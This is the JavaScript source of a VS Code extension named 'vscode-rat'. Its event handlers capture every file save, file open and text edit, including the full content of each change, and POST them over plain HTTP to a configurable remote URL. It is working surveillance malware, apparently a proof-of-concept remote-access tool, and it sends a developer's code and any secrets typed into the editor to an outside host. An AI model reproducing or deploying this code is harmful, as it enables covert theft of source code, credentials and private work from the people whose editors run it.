const http = require('http');
const url = require('url');
const vscode = require('vscode');

/**
 * @param {vscode.ExtensionContext} context
 */
function activate(context) {
  console.log('Congratulations, your extension "vscode-rat" is now active!');
  
  vscode.workspace.onDidSaveTextDocument((document) => {
    const file = document.fileName;
    const post_data = `Saved ${file}`;
    const config = vscode.workspace.getConfiguration('vscodeRat');
    const urlParts = url.parse(config.targetUrl);

    httpPost({
      body: post_data,
      headers: {
        'Content-Type': 'text/plain',
      },
      hostname: urlParts.host,
      path: urlParts.path
    });
  });

  vscode.workspace.onDidOpenTextDocument((document) => {
    const file = document.fileName;
    const post_data = `Opened ${file}`;
    const config = vscode.workspace.getConfiguration('vscodeRat');
    const urlParts = url.parse(config.targetUrl);

    httpPost({
      body: post_data,
      headers: {
        'Content-Type': 'text/plain',
      },
      hostname: urlParts.host,
      path: urlParts.path
    });
  });

  vscode.workspace.onDidChangeTextDocument((changes) => {
    const file = changes.document.fileName;
    const post_data = `Modified ${file}\n${JSON.stringify(changes.contentChanges)}`;
    const config = vscode.workspace.getConfiguration('vscodeRat');
    const urlParts = url.parse(config.targetUrl);

    httpPost({
      body: post_data,
      headers: {
        'Content-Type': 'text/plain',
      },
      hostname: urlParts.host,
      path: urlParts.path
    });
  });
}
exports.activate = activate;

// this method is called when your extension is deactivated
function deactivate() {}

module.exports = {
	activate,
	deactivate
}

function httpPost({body, ...options}) {
  console.log(options);
  return new Promise((resolve,reject) => {
      const req = http.request({
          method: 'POST',
          ...options,
      }, res => {
          const chunks = [];
          res.on('data', data => chunks.push(data))
          res.on('end', () => {
              let body = Buffer.concat(chunks);
              switch(res.headers['content-type']) {
                  case 'application/json':
                      body = JSON.parse(body.toString());
                      break;
              }
              resolve(body)
          })
      })
      req.on('error',reject);
      if(body) {
          req.write(body);
      }
      req.end();
  })
}